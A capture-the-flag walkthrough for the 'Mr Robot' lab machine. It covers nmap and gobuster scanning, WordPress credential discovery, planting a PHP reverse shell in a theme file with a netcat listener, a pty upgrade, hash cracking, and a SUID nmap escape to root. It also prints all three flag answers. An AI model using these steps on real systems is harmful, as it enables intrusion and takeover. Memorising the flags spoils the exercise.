@@ -1,0 +1,83 @@
+MR Robot CTF
+
+ip : 10.10.195.199
+
+```
+nmap scan :
+Nmap 7.70 scan initiated Thu Feb  4 11:04:19 2021 as: nmap -sC -oN tes 10.10.195.199
+Nmap scan report for 10.10.195.199
+Host is up (0.37s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE
+22/tcp  closed ssh
+80/tcp  open   http
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   https
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+Nmap done at Thu Feb  4 11:04:55 2021 -- 1 IP address (1 host up) scanned in 35.39 seconds
+```
+
+```
+gobuster scan :
+/images (Status: 301)
+/blog (Status: 301)
+/sitemap (Status: 200)
+/rss (Status: 301)
+/login (Status: 302)
+/0 (Status: 301)
+/video (Status: 301)
+/feed (Status: 301)
+/image (Status: 301)
+/atom (Status: 301)
+/wp-content (Status: 301)
+/admin (Status: 301)
+/audio (Status: 301)
+/wp-login (Status: 200)
+/css (Status: 301)
+/rss2 (Status: 301)
+/license (Status: 200)
+/wp-includes (Status: 301)
+/js (Status: 301)
+/Image (Status: 301)
+/robots (Status :301)
+```
+
+First thing first you should check the robots directory
+
+# Key 1 are in  10.10.195.199/key-1-of-3.txt : 073403c8a58a1f80d943455fb30724b9
+
+You can try to brute force the login page with fsocity.dic but, there's another way to get fast the user and password
+
+Checkout the license directory, what you got in that ?
+You see that, now loging it
+
+After loging it, you should to upload the reverse-shell.php
+Go to Appeareance > Editor and select archive.php page, then upload the reverse-shell.php (Warning: You should to change the ip address with your own ip, run ifconfig and see eth0 and don't forget to change the port too, you can change it to port 9999)
+
+Now run command > nc -lv (port)
+then you should to go tou your reverse-shell.php link > http://10.10.195.199/wp-content/themes/twentyfifteen/archive.php
+
+And BOOM, now you got in mr robot computer
+import pty shell with this command > python -c 'import pty; pty.spawn("/bin/sh")'
+
+lets see the password.raw-md5 and decode it
+
+Know we know robot pass, so we can to be robot and get the key 2
+
+# Key 2 > 822c73956184f694993bede3eb39f959
+
+Now we should to find SUID privilege
+run this command > find / -perm -u=s -type f 2>/dev/null
+remember the hint (nmap)
+
+run this command > nmap --interactive
+then type this command > !sh
+
+And BOOM, now you are on root user, lets find the key 3
+
+# Key 3 > 04787ddef27c3dee1ee161b21670b4e4
+
+Well done, know you are officialy finish the CTF AWESOME
